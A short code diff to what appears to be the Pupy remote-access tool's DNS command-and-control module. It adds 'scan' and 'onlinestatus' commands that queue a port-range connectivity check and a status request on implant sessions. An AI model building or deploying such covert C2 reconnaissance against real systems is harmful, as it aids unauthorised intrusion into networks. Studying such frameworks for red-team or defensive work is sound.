@@ -28,6 +28,12 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
 
         DnsCommandServerHandler.__init__(self, *args, **kwargs)
 
+    def onlinestatus(self, node=None, default=False):
+        return self.add_command(OnlineStatusRequest(), session=node, default=default)
+
+    def scan(self, host, first, last, node=None, default=False):
+        return self.add_command(CheckConnect(host, first, last), session=node, default=default)
+
     def connect(self, hosts, port, transport, node=None, default=False):
         commands = [
             Connect(host, port, transport) for host in hosts
@@ -247,6 +253,12 @@ class PupyDnsCnc(object):
             node=node,
             default=default
         )
+
+    def scan(self, *args, **kwargs):
+        return self.handler.scan(*args, **kwargs)
+
+    def onlinestatus(self, **kwargs):
+        return self.handler.onlinestatus(**kwargs)
 
     def disconnect(self, **kwargs):
         return self.handler.disconnect(**kwargs)
